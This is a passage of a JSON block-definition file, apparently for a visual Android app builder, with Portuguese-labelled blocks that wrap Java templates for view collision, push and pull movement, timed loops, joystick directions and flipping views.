touch_copy47","typeName":"","palette":"249","type":"c","spec":"View:%m.view empurra %m.view id:%d suavidade:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se há colisão entre %1$s e %2$s\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    float deltaX \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    float deltaY \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    if (deltaX \u003e deltaY) {\n        // Puxar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s) {\n            %2$s.setX(view2X%3$s - (view2Width%3$s - (view2X%3$s - view1X%3$s))); // Puxar para a direita\n        } else {\n            %2$s.setX(view2X%3$s + (view1X%3$s - (view2X%3$s + view2Width%3$s))); // Puxar para a esquerda\n        }\n    } else {\n        // Puxar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s) {\n            %2$s.setY(view2Y%3$s - (view2Height%3$s - (view2Y%3$s - view1Y%3$s))); // Puxar para baixo\n        } else {\n            %2$s.setY(view2Y%3$s + (view1Y%3$s - (view2Y%3$s + view2Height%3$s))); // Puxar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy19","typeName":"","palette":"249","type":"c","spec":"View:%m.view puxe %m.view id:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se há colisão entre %1$s e %2$s\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    int deltaX%3$s \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    int deltaY%3$s \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    int pullFactor \u003d %4$s; // Fator de suavidade para o puxão\n\n    if (deltaX%3$s \u003e deltaY%3$s) {\n        // Puxar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s) {\n            %2$s.setX(view2X%3$s - Math.min(pullFactor, (view2Width%3$s - (view2X%3$s - view1X%3$s)))); // Puxar para a direita\n        } else {\n            %2$s.setX(view2X%3$s + Math.min(pullFactor, (view1X%3$s - (view2X%3$s + view2Width%3$s)))); // Puxar para a esquerda\n        }\n    } else {\n        // Puxar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s) {\n            %2$s.setY(view2Y%3$s - Math.min(pullFactor, (view2Height%3$s - (view2Y%3$s - view1Y%3$s)))); // Puxar para baixo\n        } else {\n            %2$s.setY(view2Y%3$s + Math.min(pullFactor, (view1Y%3$s - (view2Y%3$s + view2Height%3$s)))); // Puxar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy72","typeName":"","palette":"249","type":"c","spec":"View:%m.view puxe %m.view id:%d suavidade:%d  ","spec2":"else"},{"code":"%1$s.contains(%2$s)","color":"#9CCC65","name":"contain","typeName":"","palette":"13","type":"b","spec":"%s contains %s "},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Verifica de onde veio a colisão e ajusta a posição\n    if (view1X%3$s \u003c view2X%3$s) {\n        %1$s.setX(view2X%3$s - view1Width%3$s); // Colidiu pela esquerda, reposiciona à esquerda de view2\n    } else if (view1X%3$s + view1Width%3$s \u003e view2X%3$s + view2Width%3$s) {\n        %1$s.setX(view2X%3$s + view2Width%3$s); // Colidiu pela direita, reposiciona à direita de view2\n    } else if (view1Y%3$s \u003c view2Y%3$s) {\n        %1$s.setY(view2Y%3$s - view1Height%3$s); // Colidiu por cima, reposiciona acima de view2\n    } else if (view1Y%3$s + view1Height%3$s \u003e view2Y%3$s + view2Height%3$s) {\n        %1$s.setY(view2Y%3$s + view2Height%3$s); // Colidiu por baixo, reposiciona abaixo de view2\n    }\n}","color":"#FF5E35B1","name":"collision","typeName":"","palette":"249","type":"e","spec":"Collision | impedir que view:%m.view  atravesse view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se view1 está completamente dentro de view2\nif (view1X%3$s \u003c view2X%3$s) {\n    %1$s.setX(view2X%3$s); // Reposiciona à esquerda de view2\n} else if (view1X%3$s + view1Width%3$s \u003e view2X%3$s + view2Width%3$s) {\n    %1$s.setX(view2X%3$s + view2Width%3$s - view1Width%3$s); // Reposiciona à direita de view2\n}\n\nif (view1Y%3$s \u003c view2Y%3$s) {\n    %1$s.setY(view2Y%3$s); // Reposiciona acima de view2\n} else if (view1Y%3$s + view1Height%3$s \u003e view2Y%3$s + view2Height%3$s) {\n    %1$s.setY(view2Y%3$s + view2Height%3$s - view1Height%3$s); // Reposiciona abaixo de view2\n}","color":"#FF5E35B1","name":"collision_copy97","typeName":"","palette":"249","type":"e","spec":"Collision | impedir que view:%m.view  saia da view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"int view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n%4$s\n}","color":"#FFF44336","name":"Collision personalizada","typeName":"","palette":"249","type":"c","spec":"CustomCollision:impedir que view:%m.view atravesse view:%m.view  id:%d "},{"code":"if (view1X%1$s \u003c view2X%1$s) {\n%2$s\n}","color":"#FFF44336","name":"esquerda","typeName":"","palette":"249","type":"c","spec":"se colidir com a parte esquerda id:%d "},{"code":"if (view1X%1$s + view1Width%1$s \u003e view2X%1$s + view2Width%1$s) {\n%2$s\n}","color":"#FFF44336","name":"direita","typeName":"","palette":"249","type":"c","spec":"se colidir com a parte direita id:%d "},{"code":"if (view1Y%1$s \u003c view2Y%1$s) {\n%2$s\n}\n","color":"#FFF44336","name":"cima","typeName":"","palette":"249","type":"c","spec":"se colidir por cima id:%d "},{"code":"if (view1Y%1$s + view1Height%1$s \u003e view2Y%1$s + view2Height%1$s) {\n%2$s\n}","color":"#FFF44336","name":"baixo","typeName":"","palette":"249","type":"c","spec":"se colidir por baixo id:%d "},{"code":"  %1$s.setX(view2X%3$s - view1Width%3$s); // Colidiu pela esquerda, reposiciona à esquerda de view2","color":"#FFF44336","name":"esquerdaa","typeName":"","palette":"249","type":" ","spec":"impedir view:%m.view de atravessar parte esquerda id:%d "},{"code":"   %1$s.setX(view2X%3$s + view2Width%3$s);","color":"#FFF44336","name":"direitaa","typeName":"","palette":"249","type":" ","spec":"impedir view:%m.view de atravessar parte direita id:%d "},{"code":"%1$s.setY(view2Y%3$s - view1Height%3$s); // Colidiu por cima, reposiciona acima de view2","color":"#FFF44336","name":"cimaa","typeName":"","palette":"249","type":" ","spec":"impedir view:%m.view de atravessar parte de cima id:%d "},{"code":"%1$s.setY(view2Y%3$s + view2Height%3$s); // Colidiu por baixo, reposiciona abaixo de view2","color":"#FFF44336","name":"baixaa","typeName":"","palette":"249","type":" ","spec":"impedir view:%m.view de atravessar parte de baixo id:%d "},{"code":"final int delay%2$s \u003d %1$s; // Delay em milissegundos\nfinal TimerTask %3$s%2$s \u003d new TimerTask() {\n    private int i%2$s \u003d 1;\n\n    @Override\n    public void run() {\n        runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                %4$s // Aqui vai o código que será executado\n\n                i%2$s++;\n            }\n        });\n    }\n};\n\n_timer.scheduleAtFixedRate(%3$s%2$s, delay%2$s, delay%2$s);","color":"#FFFFB74D","name":"loop","typeName":"","palette":"250","type":"c","spec":"loop delay em milissegundos:%d  id:%d  timer:%s.inputOnly "},{"code":"final int delay%2$s \u003d %1$s * 1000; // Delay em segundos (convertido para milissegundos)\nfinal TimerTask %3$s%2$s \u003d new TimerTask() {\n    private int i%2$s \u003d 1;\n\n    @Override\n    public void run() {\n        runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                %4$s // Aqui vai o código que será executado\n\n                i%2$s++;\n            }\n        });\n    }\n};\n\n_timer.scheduleAtFixedRate(%3$s%2$s, delay%2$s, delay%2$s);","color":"#FFFFB74D","name":"loop_copy70","typeName":"","palette":"250","type":"c","spec":"loop delay em segundos:%d  id:%d timer:%s.inputOnly   "},{"code":"final int delay%2$s \u003d %1$s * 60 * 1000; // Delay em minutos (convertido para milissegundos)\nfinal TimerTask %3$s%2$s \u003d new TimerTask() {\n    private int i%2$s \u003d 1;\n\n    @Override\n    public void run() {\n        runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                %4$s // Aqui vai o código que será executado\n\n                i%2$s++;\n            }\n        });\n    }\n};\n\n_timer.scheduleAtFixedRate(%3$s%2$s, delay%2$s, delay%2$s);","color":"#FFFFB74D","name":"loop_copy71","typeName":"","palette":"250","type":"c","spec":"loop delay em minutos:%d  id:%d  timer:%s.inputOnly "},{"code":"final int delay%2$s \u003d %1$s * 60 * 60 * 1000; // Delay em horas (convertido para milissegundos)\nfinal TimerTask %3$s%2$s \u003d new TimerTask() {\n    private int i%2$s \u003d 1;\n\n    @Override\n    public void run() {\n        runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                %4$s // Aqui vai o código que será executado\n\n                i%2$s++;\n            }\n        });\n    }\n};\n\n_timer.scheduleAtFixedRate(%3$s%2$s, delay%2$s, delay%2$s);","color":"#FFFFB74D","name":"loop_copy72","typeName":"","palette":"250","type":"c","spec":"loop delay em horas:%d  id:%d  timer:%s.inputOnly "},{"code":"","color":"#FF9C27B0","name":"direção ","typeName":"","palette":"249","type":"h","spec":"direções joystick"},{"code":"if (isMovingUp) {\n    %1$s\n}","color":"#FF9C27B0","name":"cimaaa","typeName":"","palette":"249","type":"c","spec":"Se joystick cima"},{"code":"if (isMovingDown) {\n    %1$s\n}","color":"#FF9C27B0","name":"baixooo","typeName":"","palette":"249","type":"c","spec":"se joystick baixo"},{"code":"if (isMovingLeft) {\n    %1$s\n}","color":"#FF9C27B0","name":"esquerdaaa","typeName":"","palette":"249","type":"c","spec":"Se joystick esquerda"},{"code":"if (isMovingRight) {\n    %1$s\n}","color":"#FF9C27B0","name":"direitaaa","typeName":"","palette":"249","type":"c","spec":"se joystick direita"},{"code":"// Obter escala atual\nfloat currentScaleX%2$s \u003d %1$s.getScaleX();\nfloat currentScaleY%2$s \u003d %1$s.getScaleY();\n\n// Flipar para cima\n%1$s.setScaleY(-currentScaleY%2$s); // Inverter verticalmente\n%1$s.setScaleX(currentScaleX%2$s);  // Manter a escala horizontal normal","color":"#FFBDBDBD","name":"flipcima","typeName":"","palette":"251","type":" ","spec":"%m.view  flipar pra cima id:%d "},{"code":"// Obter escala atual\nfloat currentScaleX%2$s \u003d %1$s.getScaleX();\nfloat currentScaleY%2$s \u003d %1$s.getScaleY();\n\n// Flipar para baixo (restaurar a escala original)\n%1$s.setScaleY(currentScaleY%2$s); // Manter a escala vertical normal\n%1$s.setScaleX(currentScaleX%2$s); // Manter a escala horizontal normal","color":"#FFBDBDBD","name":"fliparbaixo","typeName":"","palette":"251","type":" ","spec":"%m.view flipar pra baixo id:%d "},{"code":"// Obter escala atual\nfloat currentScaleX%2$s \u003d %1$s.getScaleX();\nfloat currentScaleY%2$s \u003d %1$s.getScaleY();\n\n// Flipar para a esquerda\n%1$s.setScaleX(-currentScaleX%2$s); // Inverter horizontalmente\n%1$s.setScaleY(currentScaleY%2$s);  // Manter a escala vertical normal","color":"#FFBDBDBD","name":"fliparesquerda","typeName":"","palette":"251","type":" ","spec":"%m.view flipar esquerda id:%d "},{"code":"// Obter escala atual\nfloat currentScaleX%2$s \u003d %1$s.getScaleX();\nfloat currentScaleY%2$s \u003d %1$s.getScaleY();\n\n// Flipar para a direita (restaurar a escala original)\n%1$s.setScaleX(currentScaleX%2$s); // Manter a escala horizontal normal\n%1$s.setScaleY(currentScaleY%2$s); // Manter a escala vertical normal","color":"#FFBDBDBD","name":"flipardireita","typeName":"","palette":"251","type":" ","spec":"%m.view flipar direita id:%d "},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Verifica de onde veio a colisão e ajusta a posição\n    if (view1X%3$s \u003c view2X%3$s) {\n        %1$s.setX(view2X%3$s - view1Width%3$s); // Colidiu pela esquerda, reposiciona à esquerda de view2\n    } else if (view1X%3$s + view1Width%3$s \u003e view2X%3$s + view2Width%3$s) {\n        %1$s.setX(view2X%3$s + view2Width%3$s); // Colidiu pela direita, reposiciona à direita de view2\n    } else if (view1Y%3$s \u003c view2Y%3$s) {\n        %1$s.setY(view2Y%3$s - view1Height%3$s); // Colidiu por cima, reposiciona acima de view2\n    } else if (view1Y%3$s + view1Height%3$s \u003e view2Y%3$s + view2Height%3$s) {\n        %1$s.setY(view2Y%3$s + view2Height%3$s); // Colidiu por baixo, reposiciona abaixo de view2\n    }\n}","color":"#FF5E35B1","name":"collision","typeName":"","palette":"252","type":"e","spec":"Collision | impedir que view:%m.view  atravesse view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se view1 está completamente dentro de view2\nif (view1X%3$s \u003c view2X%3$s) {\n    %1$s.setX(view2X%3$s); // Reposiciona à esquerda de view2\n} else if (view1X%3$s + view1Width%3$s \u003e view2X%3$s + view2Width%3$s) {\n    %1$s.setX(view2X%3$s + view2Width%3$s - view1Width%3$s); // Reposiciona à direita de view2\n}\n\nif (view1Y%3$s \u003c view2Y%3$s) {\n    %1$s.setY(view2Y%3$s); // Reposiciona acima de view2\n} else if (view1Y%3$s + view1Height%3$s \u003e view2Y%3$s + view2Height%3$s) {\n    %1$s.setY(view2Y%3$s + view2Height%3$s - view1Height%3$s); // Reposiciona abaixo de view2\n}","color":"#FF5E35B1","name":"collision_copy97","typeName":"","palette":"252","type":"e","spec":"Collision | impedir que view:%m.view  saia da view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"int view1X%3$s \u003d (int) %1$s.getX();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view2X%3$s \u003d (int) %2$s.getX();\n\nif (view1X%3$s \u003c view2X%3$s) {\n    %1$s.setX(view2X%3$s); // Reposiciona view1 para a esquerda de view2\n    %4$s; // Adicione o código adicional necessário aqui\n}","color":"#FF5E35B1","name":"collision_copy48","typeName":"","palette":"252","type":"c","spec":"Collision | impedir que view:%m.view  saia da esquerda da view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"int view1X%3$s \u003d (int) %1$s.getX();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Width%3$s \u003d %2$s.getWidth();\n\nif (view1X%3$s + view1Width%3$s \u003e view2X%3$s + view2Width%3$s) {\n    %1$s.setX(view2X%3$s + view2Width%3$s - view1Width%3$s); // Reposiciona view1 para a direita de view2\n    %4$s; // Adicione o código adicional necessário aqui\n}","color":"#FF5E35B1","name":"collision_copy44","typeName":"","palette":"252","type":"c","spec":"Collision | impedir que view:%m.view  saia da direita da view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"int view1Y%3$s \u003d (int) %1$s.getY();\nint view1Height%3$s \u003d %1$s.getHeight();\nint view2Y%3$s \u003d (int) %2$s.getY();\n\nif (view1Y%3$s \u003c view2Y%3$s) {\n    %1$s.setY(view2Y%3$s); // Reposiciona view1 para cima de view2\n    %4$s; // Adicione o código adicional necessário aqui\n}","color":"#FF5E35B1","name":"collision_copy63","typeName":"","palette":"252","type":"c","spec":"Collision | impedir que view:%m.view  saia da cima da view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"int view1Y%3$s \u003d (int) %1$s.getY();\nint view1Height%3$s \u003d %1$s.getHeight();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nif (view1Y%3$s + view1Height%3$s \u003e view2Y%3$s + view2Height%3$s) {\n    %1$s.setY(view2Y%3$s + view2Height%3$s - view1Height%3$s); // Reposiciona view1 para baixo de view2\n    %4$s; // Adicione o código adicional necessário aqui\n}","color":"#FF5E35B1","name":"collision_copy93","typeName":"","palette":"252","type":"c","spec":"Collision | impedir que view:%m.view  saia pra baixo da view:%m.view id:%d se colidirem:","spec2":"else"},{"code":"int view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n%4$s\n}","color":"#FFF44336","name":"Collision personalizada","typeName":"","palette":"252","type":"c","spec":"CustomCollision:impedir que view:%m.view atravesse view:%m.view  id:%d "},{"code":"if (view1X%1$s \u003c view2X%1$s) {\n%2$s\n}","color":"#FFF44336","name":"esquerda","typeName":"","palette":"252","type":"c","spec":"se colidir com a parte esquerda id:%d "},{"code":"if (view1X%1$s + view1Width%1$s \u003e view2X%1$s + view2Width%1$s) {\n%2$s\n}","color":"#FFF44336","name":"direita","typeName":"","palette":"252","type":"c","spec":"se colidir com a parte direita id:%d "},{"code":"if (view1Y%1$s \u003c view2Y%1$s) {\n%2$s\n}\n","color":"#FFF44336","name":"cima","typeName":"","palette":"252","type":"c","spec":"se colidir por cima id:%d "},{"code":"if (view1Y%1$s + view1Height%1$s \u003e view2Y%1$s + view2Height%1$s) {\n%2$s\n}","color":"#FFF44336","name":"baixo","typeName":"","palette":"252","type":"c","spec":"se colidir por baixo id:%d "},{"code":"  %1$s.setX(view2X%3$s - view1Width%3$s); // Colidiu pela esquerda, reposiciona à esquerda de view2","color":"#FFF44336","name":"esquerdaa","typeName":"","palette":"252","type":" ","spec":"impedir view:%m.view de atravessar parte esquerda id:%d "},{"code":"   %1$s.setX(view2X%3$s + view2Width%3$s);","color":"#FFF44336","name":"direitaa","typeName":"","palette":"252","type":" ","spec":"impedir view:%m.view de atravessar parte direita id:%d "},{"code":"%1$s.setY(view2Y%3$s - view1Height%3$s); // Colidiu por cima, reposiciona acima de view2","color":"#FFF44336","name":"cimaa","typeName":"","palette":"252","type":" ","spec":"impedir view:%m.view de atravessar parte de cima id:%d "},{"code":"%1$s.setY(view2Y%3$s + view2Height%3$s); // Colidiu por baixo, reposiciona abaixo de view2","color":"#FFF44336","name":"baixaa","typeName":"","palette":"252","type":" ","spec":"impedir view:%m.view de atravessar parte de baixo id:%d "},{"code":"%1$s.setY(view2Y%3$s + view2Height%3$s); // Colidiu por baixo, reposiciona abaixo de view2","color":"#FFF44336","name":"header","typeName":"","palette":"252","type":"h","spec":"empurrar/puxar"},{"code":"float v1X \u003d %1$s.getX();\nfloat v1Y \u003d %1$s.getY();\nfloat v1W \u003d %1$s.getWidth();\nfloat v1H \u003d %1$s.getHeight();\n\nfloat v2X \u003d %2$s.getX();\nfloat v2Y \u003d %2$s.getY();\nfloat v2W \u003d %2$s.getWidth();\nfloat v2H \u003d %2$s.getHeight();\n\nif ((v1X \u003c v2X + v2W) \u0026\u0026 \n    (v1X + v1W \u003e v2X) \u0026\u0026 \n    (v1Y \u003c v2Y + v2H) \u0026\u0026 \n    (v1Y + v1H \u003e v2Y)) {\n    // As views estão encostando\n    // Adicione aqui o código que deseja executar\n    %3$s\n}else{\n%4$s\n}","color":"#FF7E57C2","name":"if view touch","typeName":"","palette":"252","type":"e","spec":"se view:%m.view tocar view:%m.view ","spec2":"else"},{"code":"float v1X%3$s \u003d %1$s.getX();\nfloat v1Y%3$s \u003d %1$s.getY();\nfloat v1W%3$s \u003d %1$s.getWidth();\nfloat v1H%3$s \u003d %1$s.getHeight();\n\nfloat v2X%3$s \u003d %2$s.getX();\nfloat v2Y%3$s \u003d %2$s.getY();\nfloat v2W%3$s \u003d %2$s.getWidth();\nfloat v2H%3$s \u003d %2$s.getHeight();\n\nif ((v1X%3$s \u003c v2X%3$s + v2W%3$s) \u0026\u0026 \n    (v1X%3$s + v1W%3$s \u003e v2X%3$s) \u0026\u0026 \n    (v1Y%3$s \u003c v2Y%3$s + v2H%3$s) \u0026\u0026 \n    (v1Y%3$s + v1H%3$s \u003e v2Y%3$s)) {\n    // As views estão encostando\n    // Adicione aqui o código que deseja executar\n    %4$s\n}else{\n%5$s\n}","color":"#FF7E57C2","name":"if views touch","typeName":"","palette":"252","type":"e","spec":"Se View:%m.view tocar %m.view  id:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se há colisão entre %1$s e %2$s\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    int deltaX%3$s \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    int deltaY%3$s \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    if (deltaX%3$s \u003e deltaY%3$s) {\n        // Empurrar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s) {\n            %2$s.setX(view2X%3$s + view1Width%3$s); // Empurrar para a direita\n        } else {\n            %2$s.setX(view2X%3$s - view1Width%3$s); // Empurrar para a esquerda\n        }\n    } else {\n        // Empurrar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s) {\n            %2$s.setY(view2Y%3$s + view1Height%3$s); // Empurrar para baixo\n        } else {\n            %2$s.setY(view2Y%3$s - view1Height%3$s); // Empurrar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy23","typeName":"","palette":"252","type":"c","spec":"View:%m.view empurra %m.view id:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\n// Obtenha o layout pai das views\nView parentLayout \u003d (View) %1$s.getParent();\n\n// Obtenha as dimensões do layout pai\nint containerWidth \u003d parentLayout.getWidth();\nint containerHeight \u003d parentLayout.getHeight();\n\n// Código de verificação de colisão e movimento (como antes)\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\nint pushFactor \u003d 10; // Fator de suavidade para o empurrão\n\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c view2Y%3$s + view2Height%3$s \u0026\u0026\n    view1Y%3$s + view1Height%3$s \u003e view2Y%3$s) {\n\n    // Calcula a diferença nas coordenadas X e Y\n    int deltaX%3$s \u003d Math.abs((view1X%3$s + view1Width%3$s / 2) - (view2X%3$s + view2Width%3$s / 2));\n    int deltaY%3$s \u003d Math.abs((view1Y%3$s + view1Height%3$s / 2) - (view2Y%3$s + view2Height%3$s / 2));\n\n    if (deltaX%3$s \u003e deltaY%3$s) {\n        // Empurrar horizontalmente\n        if (view1X%3$s \u003c view2X%3$s \u0026\u0026 view2X%3$s + view2Width%3$s + pushFactor \u003c containerWidth) {\n            %2$s.setX(view2X%3$s + pushFactor); // Empurrar para a direita\n        } else if (view1X%3$s \u003e view2X%3$s \u0026\u0026 view2X%3$s - pushFactor \u003e 0) {\n            %2$s.setX(view2X%3$s - pushFactor); // Empurrar para a esquerda\n        }\n    } else {\n        // Empurrar verticalmente\n        if (view1Y%3$s \u003c view2Y%3$s \u0026\u0026 view2Y%3$s + view2Height%3$s + pushFactor \u003c containerHeight) {\n            %2$s.setY(view2Y%3$s + pushFactor); // Empurrar para baixo\n        } else if (view1Y%3$s \u003e view2Y%3$s \u0026\u0026 view2Y%3$s - pushFactor \u003e 0) {\n            %2$s.setY(view2Y%3$s - pushFactor); // Empurrar para cima\n        }\n    }\n}","color":"#FF7E57C2","name":"if views touch_copy47","typeName":"","palette":"252","type":"c","spec":"View:%m.view empurra %m.view id:%d suavidade:%d ","spec2":"else"},{"code":"// Dentro do evento onde você está verificando a colisão\n\nint view1X%3$s \u003d (int) %1$s.getX();\nint view1Y%3$s \u003d (int) %1$s.getY();\nint view1Width%3$s \u003d %1$s.getWidth();\nint view1Height%3$s \u003d %1$s.getHeight();\n\nint view2X%3$s \u003d (int) %2$s.getX();\nint view2Y%3$s \u003d (int) %2$s.getY();\nint view2Width%3$s \u003d %2$s.getWidth();\nint view2Height%3$s \u003d %2$s.getHeight();\n\n// Verifica se há colisão entre %1$s e %2$s\nif (view1X%3$s \u003c view2X%3$s + view2Width%3$s \u0026\u0026\n    view1X%3$s + view1Width%3$s \u003e view2X%3$s \u0026\u0026\n    view1Y%3$s \u003c 